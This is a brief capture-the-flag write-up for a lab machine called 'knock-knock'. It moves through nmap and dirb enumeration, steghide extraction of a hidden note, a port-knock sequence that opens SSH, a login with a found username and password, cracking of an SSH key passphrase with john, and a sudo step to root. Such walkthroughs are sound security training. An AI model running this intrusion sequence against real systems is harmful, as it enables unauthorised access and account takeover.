# knock-knock
knock-knock writeup

We start with a nmap scan:

`nmap -Pn -A $IP`

Just one open port : 80

More enumeration:

`dirb http://$IP`

We find 2 directory : $IP/images/upload/

After a look in source-code whe find a picture who not appears on the site.

Download the jpg with a wget command.

`steghide info picture.jpg`

Without password we find a .txt embed inside

`steghide extract -sf picture.jpg`

`Hey Woody. 

Great idea to hide access to the server but don't be too confident and change
 your bad password. And change the default configuration sequence ASAP please.
Thanks`


Install knockd, take a look at knockd.conf

`knock $IP 7000:tcp, 8000:tcp, 9000:tcp`

Another nmap scan and we find a ssh on port 22.

Log in with woody:woodpecker credentials.

we find a note.txt who give us some, hint for billy's passphrase.

Found a rsa key encode in base64 in billy's home folder.

`ssh2john id_rsa > hash`
`cat /usr/share/wordlists/rockyou.txt | grep **** > pass.txt`
`john --wordlist=pass.txt hash`

We find the password and log to billy's account with the rsa key

Sudo with the same password and we are root!!!
